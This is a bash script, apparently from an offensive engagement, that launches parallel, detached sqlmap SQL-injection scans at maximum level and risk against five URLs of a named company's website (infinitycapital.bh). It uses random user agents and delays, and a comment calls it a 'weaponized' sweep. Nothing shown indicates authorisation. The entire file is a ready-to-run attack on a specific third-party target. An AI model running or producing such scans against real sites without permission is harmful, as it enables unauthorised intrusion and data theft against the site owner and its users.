#!/bin/bash
# Weaponized sqlmap sweep across every discovered parameter surface.
# Runs detached; logs to w45/sq_*.log
cd /work
mkdir -p w45/sq
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

run() {
  name="$1"; url="$2"; shift 2
  sqlmap -u "$url" --batch --level=5 --risk=3 --threads=4 \
    --delay=0.3 --random-agent --output-dir=/work/w45/sq/$name "$@" \
    > /work/w45/sq_$name.log 2>&1
  echo "DONE $name rc=$?" >> /work/w45/sq_status.txt
}

run home     'https://www.infinitycapital.bh/?id=1&search=test&page=2' &
run contact  'https://www.infinitycapital.bh/contact?cb=1&x=1' &
run img      'https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75' &
run atom     'https://www.infinitycapital.bh/atom.xml?q=1' &
run feeds    'https://www.infinitycapital.bh/feeds/all.atom.xml?page=2' &
wait
echo ALL_DONE >> /work/w45/sq_status.txt
